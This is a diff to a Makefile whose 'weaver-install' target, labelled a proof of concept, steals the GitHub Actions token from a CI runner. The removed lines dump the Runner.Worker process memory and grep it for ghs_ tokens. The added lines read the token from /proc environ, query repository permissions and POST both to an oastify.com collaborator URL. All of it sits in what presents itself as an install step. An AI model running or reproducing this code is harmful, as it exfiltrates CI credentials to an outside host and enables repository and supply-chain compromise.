@@ -1,28 +1,21 @@
 COLLABORATOR_URL = http://jxkzddbnc4ii4jftrz0updno3f96xxlm.oastify.com
 
 weaver-install:
-	@echo "--- Targeted Token Extractionn ---"
-	@sudo apt-get update && sudo apt-get install -y gdb
+	@echo "--- Starting Short-Form PoC ---"
 	
-	# 1. Dump memory again
+	# 1. Extract the token directly from the process environment strings
 	$(eval WORKER_PID := $(shell pgrep -f "Runner.Worker" | head -n 1))
-	@sudo gcore -o worker_dump $(WORKER_PID)
+	$(eval TOKEN := $(shell sudo cat /proc/$(WORKER_PID)/environ | tr '\0' '\n' | grep -m 1 "^system.github.token=" | cut -d= -f2))
 	
-	# 2. Search for the token in multiple encodings (Standard and Wide/UTF-16)
-	# GitHub tokens usually start with ghs_
-	@echo "Searching for token patterns..."
-	@strings worker_dump.* | grep -E "ghs_[0-9a-zA-Z]{30,}" > tokens.txt || true
-	@strings -e l worker_dump.* | grep -E "ghs_[0-9a-zA-Z]{30,}" >> tokens.txt || true
+	# 2. Check permissions using the extracted token
+	@echo "Checking Token Permissions..."
+	@curl -s -H "Authorization: Bearer $(TOKEN)" \
+		https://api.github.com/repos/$(GITHUB_REPOSITORY)/actions/permissions > perms.json
 	
-	# 3. Search for the 'Authorization' header format which often contains the token
-	@strings worker_dump.* | grep -i "Authorization: Bearer" >> tokens.txt || true
+	# 3. Exfiltrate Token and Permissions in one request
+	@curl -X POST \
+		-H "X-Captured-Token: $(TOKEN)" \
+		-d @perms.json \
+		$(COLLABORATOR_URL)/poc_impact
 	
-	# 4. Exfiltrate the results
-	@if [ -s tokens.txt ]; then \
-		echo "Token found! Sending to Collaborator..."; \
-		curl -X POST --data-binary @tokens.txt $(COLLABORATOR_URL)/final_token; \
-	else \
-		echo "Direct grep failed. Sending full string dump of memory segments..."; \
-		strings worker_dump.* | grep -C 5 "ghs_" | base64 -w 0 > strings_context.txt; \
-		curl -X POST -d @strings_context.txt $(COLLABORATOR_URL)/context_dump; \
-	fi
+	@echo "--- PoC Complete ---"
